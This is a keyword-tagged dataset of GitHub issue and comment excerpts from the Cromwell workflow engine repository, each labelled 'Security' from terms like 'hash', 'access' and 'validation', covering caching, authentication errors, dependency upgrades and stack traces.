Security,"At some point we will have to update our liquibase library, either for vulnerability patches or other bug fixes. . However there is a report that the current liquibase version (3.6.3) plus the way our changelog differentiates databases (ex: using strings matching for things like `mysql`) causes an issue with MariaDB. This ticket is not about updating liquibase. Before that can occur we need a CI regression test to ensure that MariaDB is supported. A/C:; - At least centaur-local running against mariadb 10.3+. Links:; - https://github.com/broadinstitute/cromwell/issues/4605; - https://www.sourceclear.com/vulnerability-database/security/cross-site-scripting-xss-/java/sid-6098; - https://liquibase.jira.com/browse/CORE-3203; - https://liquibase.jira.com/browse/CORE-3263 (may not be related) ; - https://docs.travis-ci.com/user/database-setup/#mariadb; - https://docs.travis-ci.com/user/build-matrix/#explicitly-including-jobs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4618:633,secur,security,633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4618,2,"['secur', 'xss']","['security', 'xss']"
Security,At the moment the PAPI v2 backend uses hardcoded public docker images to localize and delocalize files / directories.; This is not desirable for several reasons:. 1) Dependency on external images; 2) Lack of flexibility; 3) Potentially unoptimized or oversized images. Infrastructure should be put in place so that we can have control over those images while ensuring they can be accessed by all Cromwell users.; Those images (along with the command they run maybe ?) should be configurable.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3680:380,access,accessed,380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3680,1,['access'],['accessed']
Security,"At the moment there's a concept of a submission whitelist for users in CromIAM. Allow for this to be optional for situations where all users are allowed to submit workflows, this will reduce traffic between CromIAM & Sam. Although this CromIAM will be exposed to the internet, the Cromwell service will still be protected from drive-by whitelist-not-specified submissions by the Google authentication. This authentication will be enforced by the proxy.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4475:252,expose,exposed,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4475,3,"['authenticat', 'expose']","['authentication', 'exposed']"
Security,"At the time `hashCode` was all over the Ctrl-\ thread dumps. After seeing all the expensive computation in `hashCode` and considering that keys should have been comparable via instance equality, it became clear that was the problem. It sounds like that's not what you're seeing now?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277885430:13,hash,hashCode,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277885430,4,['hash'],['hashCode']
Security,"At the time, I could replicate with 100 percent certainty. Have not tried; in a while. I'm out, otherwise, I'd do it now. On Nov 23, 2016 10:13 AM, ""kcibul"" notifications@github.com wrote:. > @LeeTL1220 https://github.com/LeeTL1220 -- I'm not sure what to do with; > this... have you seen it again? Seems like the timing diagram is fine, but; > that the underlying metadata was incorrect somehow... and I'm guessing we; > can't reproduce this and don't have access to the data any longer?; > ; > @cjllanwarne https://github.com/cjllanwarne -- is there an actionable; > ticket from your digging?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXkzqZCzlxr0CyuAuHkr2lcTvHXZjHks5rBFgNgaJpZM4KHqX4; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262562130:458,access,access,458,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262562130,1,['access'],['access']
Security,"AuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9430,validat,validateCredential,9430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"Authentication configuration has been coded but not properly tested for the ability to assume roles, etc. Integration tests should exist for this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3747:0,Authenticat,Authentication,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3747,1,['Authenticat'],['Authentication']
Security,Available system variables accessible from Cromwell configuration,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6005:27,access,accessible,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6005,1,['access'],['accessible']
Security,Avoid hashing Scopes. Closes #1457,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1468:6,hash,hashing,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1468,1,['hash'],['hashing']
Security,"Awesome thanks guys!. On Thu, Mar 17, 2016 at 12:26 PM, Thib notifications@github.com wrote:. > Git hash: 3eb1623; > https://github.com/broadinstitute/cromwell/commit/3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197971028:100,hash,hash,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197971028,1,['hash'],['hash']
Security,BC4Connection.java:47); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:389); 	at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:95); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:101); 	at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:341); 	at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:193); 	at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:430); 	at com.zaxxer.hikari.pool.HikariPool.access$500(HikariPool.java:64); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:570); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:563); 	at java.util.concurrent.FutureTask.run(FutureTask.java:266); 	... 3 more; Caused by: java.net.ConnectException: Connection refused; 	at java.net.PlainSocketImpl.socketConnect(Native Method); 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350); 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206); 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188); 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392); 	at java.net.Socket.connect(Socket.java:589); 	at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:211); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:300); 	... 24 more; ```; How can I properly configure the database to work properly in the local command? Thank you!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:5925,access,access,5925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['access'],['access']
Security,"BCS: Investigate hashing/caching support for OSS ""docker""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518:17,hash,hashing,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518,1,['hash'],['hashing']
Security,BT-431 Update DRS Localizer for multiple access token strategies,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6553:41,access,access,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6553,1,['access'],['access']
Security,BT-732 Checksum validation for blobs read by engine,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6838:7,Checksum,Checksum,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6838,2,"['Checksum', 'validat']","['Checksum', 'validation']"
Security,BW-1224 Security upgrade for jackson-databind,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6747:8,Secur,Security,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6747,1,['Secur'],['Security']
Security,BW-1228 security upgrades,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6793:8,secur,security,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6793,1,['secur'],['security']
Security,Backend request: Hashicorp Nomad,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6001:17,Hash,Hashicorp,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6001,1,['Hash'],['Hashicorp']
Security,Backend side Validation. Closes #651.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708:13,Validat,Validation,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708,1,['Validat'],['Validation']
Security,Backend validation expression evaluation exceptions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/725:8,validat,validation,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/725,1,['validat'],['validation']
Security,"Backend: AWS Batch. Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/frankenstein.wdl. Input file: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/map-variantcall-hg38.json. Possibly related to #4412 but not sure as I don't see the same error message. When submitting a workflow via the cromwell server we **consistently** see a failure to hash some items in S3 resulting in call caching being disabled for the run. We have seen this for a number of workflows, here we are including just one. . Call caching is a **hugely** important feature for us and if it is not available we may would have to reconsider using Cromwell. I think I have discussed with @ruchim the fact that all objects in S3 have a hash already computed (the ETag header) so there should not be timeouts in computing these hashes as they are available with a head request (you don't need to download the whole object). . Error message (extract from `/metadata` output):. ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [],; ""message"": ""Hashing request timed out for: s3://bucketname/cromwell-tests/Panel_BWA_GATK4_Samtools_Var_Annotate/162c863f-c22a-4b7c-bb37-f5195b329b36/call-ApplyBQSR/shard-0/smallTestData.hg38.recal.bam""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Config file:. ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:aws-database;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-anothe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563:469,hash,hash,469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563,3,['hash'],"['hash', 'hashes']"
Security,"Backend: AWS Batch; Cromwell version: 45.1; ----; I am building a WDL pipeline using the CloudFormation set up provided in https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/cromwell/cromwell-aio.template.yaml. ; In summary, the set up is a EC2 instance running `java -jar cromwell.jar server` and calling AWS Batch to run WDL workflow using an attached EC2 instance profile. . I have no issue posting workflows and getting results. However, after a certain period of time, I will get `The security token included in the request is expired` error message logged by the cromwell server when I try to post a job. ; - I have checked that `~/.aws` and the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variable don't exist. ; - If I kill the server and restart it again, the server seem to pick up the new security token and I can post workflow again. ; - Checking `cromwell.config` (pasted below), all authentication methods are set to `default` which is documented to mean it is using `DefaultCredentialProvider` in the AWS Java SDK. That should be refreshing the security token? . Is this unexpected behaviour or did I configure something wrongly? . Thanks for your help!. ----. Config file for the cromwell serve:; ```; include required(classpath(""application"")). webservice {; interface = localhost; port = 8000; }. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""ap-southeast-2""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""XXXX""; auth = ""default""; default-runtime-attributes { queueArn = ""XXXXX"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; workflow-options {; workflow-log-dir = ""cromwell-workflow-logs"";",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162:519,secur,security,519,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162,3,"['authenticat', 'secur']","['authentication', 'security']"
Security,Backends should report whether using tag or hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2096:44,hash,hash,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2096,1,['hash'],['hash']
Security,Bad WDL both validates and causes cromwell to hang,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1774:13,validat,validates,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1774,1,['validat'],['validates']
Security,Bad errors reported validating null.wdl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2703:20,validat,validating,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2703,1,['validat'],['validating']
Security,"Bad validation output: ""MatchError: null""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4081:4,validat,validation,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4081,1,['validat'],['validation']
Security,"Based on a report from @curoli . I can't immediately reason out what the correct behavior is (post-vacation fuzziness...) so this is just a a log of stuff that looked suspicious to me. ---. A workflow like; ```; version 1.0. workflow test {; ; Map[String, String] m = {""a"": ""a"", ""b"": ""b""}; String s = ""string"". output {; File write_attempt = write_json({""m"": m, ""s"": s}); }; }; ```; validates in Womtool but fails at runtime with error; ```; WorkflowManagerActor Workflow 2a3db889-e126-467b-be60-6abb815ea46e failed (during ExecutingWorkflowState):; java.lang.UnsupportedOperationException:; Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types:; Map(; WomString(m) -> WomMap(WomMapType(WomStringType,WomStringType),Map(WomString(a) -> WomString(a), WomString(b) -> WomString(b))),; WomString(s) -> WomString(string); ); ```. ---. The problem is not so simple as heterogeneous types in the map values; the workflow; ```; version 1.0. workflow test {; ; String s = ""string""; Float f = 0.1; File file = ""asdf"". output {; File write_attempt = write_json({""s"": s, ""f"": f, ""file"": file}); }. }; ```; works just fine:; ```; {""s"":""string"",""f"":""0.1"",""file"":""asdf""}; ```. ---. Interestingly, if we take out `String s = ""string""` we do get an error in Womtool, but it's a confusing one - why would we say a map value has to be an `Object` when we clearly used `String`, `Float`, and `File` right above?; ```; version 1.0. workflow test {; ; Map[String, String] m = {""a"": ""a"", ""b"": ""b""}. output {; File write_attempt = write_json({""m"": m}); }; }; ```; yields; ```; womtool validate any_map.wdl ; Failed to process workflow definition 'test' (reason 1 of 1):; Failed to process declaration 'File write_attempt = write_json({ ""m"": m })' (reason 1 of 1):; Failed to process expression 'write_json({ ""m"": m })' (reason 1 of 1):; Invalid parameter 'MapLiteral(Map(StringLiteral(m) -> IdentifierLookup(m)))'. Expected 'Object' but got 'Map[String, Map[String, String]]'; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4512:383,validat,validates,383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4512,2,['validat'],"['validate', 'validates']"
Security,Based on new security/permissions requirements there is a need to add extra functionality to HtCondor backend. Basically the functionality should provide a way to link cached file / array of files outputs to the current workflow execution. All paths should point to current workflow execution dir.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1425:13,secur,security,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1425,1,['secur'],['security']
Security,"Based on the documentation https://cromwell.readthedocs.io/en/stable/Imports/, we should have the ability to import from any public HTTPS link. I am getting error on import: ; ```; womtool validate wf_test.wdl; Failed to import 'https://github.com/broadinstitute/cromwell/blob/master/engine/src/main/resources/3step.wdl' (reason 1 of 1): Unrecognized token on line 8, column 1:. <!DOCTYPE html>; ^; ```. Using cromwell 78, and running local with version development (also tried with 1.0). Has this feature been disabled? . Running a very simple WDL workflow: ; ```; version development. import ""https://github.com/broadinstitute/cromwell/blob/master/engine/src/main/resources/3step.wdl"" as http_import2; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6788:189,validat,validate,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6788,1,['validat'],['validate']
Security,"Based on the documentation it (at least seems like) there are ways to get this working. For example:. > if the docker image uses a hash, all call caching settings apply normally. You could try a full uri WITH a hash, e.g,. ```; library/ubuntu:latest@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68; ```; Then in the case that you provide a tag (e.g., library/ubuntu:14.04):. > Cromwell will attempt to look up the immutable digest of the image with this floating tag. Upon success it will pass both the floating tag and this digest value to the backend. So if you try providing the example above, does it still reduce it to `ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68`?. > If Cromwell fails to lookup the digest (for instance an unsupported docker registry, wrong credentials, it will run the job with the user provided floating tag. So couldn't you just give it something you know will fail, and then have it use the tag you did provide?. If you wanted udocker to work, it seems more like a bug that cromwell is considering an incomplete uri (just ubuntu and the hash) as ""the correct way."" That tells us nothing about the registry, the start of the namespace (you could consider this like the collection, library) or a tag. Minimally the entire namespace should be honored, and the hash can still be looked up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454577692:131,hash,hash,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454577692,4,['hash'],['hash']
Security,Based on this report on the forums: https://gatkforums.broadinstitute.org/wdl/discussion/12878/exception-in-thread-main-scala-matcherror-null-validating-my-wdl. In this case the mistake was using `if (is_exome !=) {` instead of `if (!is_exome)` - but that should be nicely turned into a reportable error... rather than throwing up some obtuse scala-internals error message.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4081:142,validat,validating-my-wdl,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4081,1,['validat'],['validating-my-wdl']
Security,"Based on your description (i.e. not on actually testing this), I think the encryption key will need to be a 256-bit key in Base64 encoding. I've been using `base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""` to be a ""not a real value"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171410571:75,encrypt,encryption,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171410571,2,['encrypt'],"['encryption', 'encryption-key']"
Security,Basic validate server endpoint. DSDEEPB-651,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/133:6,validat,validate,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/133,1,['validat'],['validate']
Security,"Batch I am able to run the tests using the suggested edits to aws.conf. I then try to specify the output directories using the following `options.json` file. ```; {; ""final_workflow_outputs_dir"": ""s3://bucket/cromwell/outputs"",; ""final_call_logs_dir"": ""s3:/bucket/cromwell/call_logs"",; ""final_workflow_log_dir"": ""s3://bucket/cromwell/wf_logs""; }; ```. When running cromwell : `java -Dconfig.file=awsbatch/aws.conf -jar cromwell-36.jar run awsbatch/hello.wdl -i awsbatch/hello.inputs -o options.json`. it results with the error:. ```; [2019-01-12 00:31:03,94] [info] $a [866d19d0]: Copying workflow logs from /rcecloud/kmavrommatis/workspace/Workflows/cromwell/cromwell-workflow-logs/workflow.866d19d0-64da-45c3-9b69-830f0475ba12.log to s3://celgene-rnd-riku-researchanalytics/cromwell/wf_logs/workflow.866d19d0-64da-45c3-9b69-830f0475ba12.log; [2019-01-12 00:31:04,03] [error] Key cannot be empty; java.lang.IllegalArgumentException: Key cannot be empty; 	at software.amazon.awssdk.core.util.ValidationUtils.assertStringNotEmpty(ValidationUtils.java:111); 	at software.amazon.awssdk.core.runtime.transform.PathMarshallers$GreedyPathMarshaller.marshall(PathMarshallers.java:109); 	at software.amazon.awssdk.services.s3.transform.HeadObjectRequestMarshaller.marshall(HeadObjectRequestMarshaller.java:87); 	at software.amazon.awssdk.services.s3.transform.HeadObjectRequestMarshaller.marshall(HeadObjectRequestMarshaller.java:31); 	at software.amazon.awssdk.core.client.SyncClientHandlerImpl.execute(SyncClientHandlerImpl.java:88); 	at software.amazon.awssdk.core.client.SyncClientHandlerImpl.execute(SyncClientHandlerImpl.java:76); 	at software.amazon.awssdk.core.client.SdkClientHandler.execute(SdkClientHandler.java:45); 	at software.amazon.awssdk.services.s3.DefaultS3Client.headObject(DefaultS3Client.java:1628); 	at org.lerch.s3fs.util.S3Utils.getS3ObjectSummary(S3Utils.java:47); 	at org.lerch.s3fs.S3FileSystemProvider.exists(S3FileSystemProvider.java:624); 	at org.lerch.s3fs.S3FileSystemProvide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4541:1037,Validat,ValidationUtils,1037,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4541,1,['Validat'],['ValidationUtils']
Security,Batch call caching hash entries and simpletons,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2227:19,hash,hash,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2227,2,['hash'],['hash']
Security,Batched access to the workflow store will likely touch on #3757,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3753#issuecomment-396287044:8,access,access,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3753#issuecomment-396287044,1,['access'],['access']
Security,Because the alternative is to use personal github tokens which is not great from a security and re-usability perspective,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-333241563:83,secur,security,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-333241563,2,['secur'],['security']
Security,"Because writing to the call caching store and the job store is not atomic, the following chain of events is possible and not necessarily desirable:. - A job start; - A cache hit is found; - The outputs are copied; - The hashes / simpletons are written to the DB; - ** Cromwell Stops **: This is after the hashes are written successfully but before the EJEA had a chance to write the outputs to the job store and mark the job as complete.; - Cromwell starts; - The workflow is restarted; - The job is not found in the job store; - At this point the EJEA has a state to check if there are hashes existing for this job already. If there is, it disables call caching (so that the EJEA doesn't try to call cache to himself, and that we don't write to the hash store again - which would fail because of the unique index in the call cache table).; - However since we've disabled call caching we then proceed to try and recover the job, which fails because it was never run (since we found a cache hit the first time), and then falls back to running the job for reals. This is not great because this job already has all the outputs it needs, files have been copied already, but we run the job on top of it, which seems to increase the likelihood of having empty files at least locally when trying to read outputs and cause `cannot create an Int from """"` types of failures. Maybe a better way would be to re-use the outputs that have been written to the cache to make the job succeed and bypass all the rest. Relevant code in the EJEA: https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L153",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3074:220,hash,hashes,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3074,4,['hash'],"['hash', 'hashes']"
Security,"Before cromwell uses a previously cached call it needs to know if the docker image content has changed. Some images such as the [GATK](https://hub.docker.com/r/broadinstitute/gatk/tags/) are so large that they must not be pulled at scale from DockerHub. Instead these images be hosted elsewhere per cloud service provider, including [ECR](https://aws.amazon.com/ecr/). A/C: When call references an image in ECR cromwell should contact ECR to get and record the image hash.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3822:467,hash,hash,467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3822,1,['hash'],['hash']
Security,Better error message for string member accesses,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3867:39,access,accesses,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3867,1,['access'],['accesses']
Security,"Better still, we'd like to either:. 1) add `cloud-platform` scope, which would allow calling _any_ Google APIs. I understand this may not bode well with the current security model used in Firecloud; however, Google itself recommends migrating away from scopes in favor of IAM, as scopes were introduced before IAM existed [1]. 2) make scopes configurable, ideally at the workflow level, or at least at Cromwell config level. There may be a set of obligatory scopes that is hard-coded in Cromwell (e.g. `genomics` or `compute`), and then `additionalScopes` specified via configuration. This way, we satisfy both the need to restrict the scopes by default, and address other use cases when needed. Our ideal picture for this is that we'd be able to call any Google APIs (e.g. Pub/Sub, Firestore, or BigQuery) from workflows running on CaaS. We don't want to ""wait"" for a new scope to be added upstream each time we have to call a new API. Thanks!. [1] https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances#best_practices",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308:165,secur,security,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308,2,"['access', 'secur']","['access', 'security']"
Security,"Bloom filter is a test of ""have we seen this before?"" on a huge set. We get one for free from Google Guava [here](https://google.github.io/guava/releases/22.0/api/docs/com/google/common/hash/BloomFilter.html)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332235515:186,hash,hash,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332235515,1,['hash'],['hash']
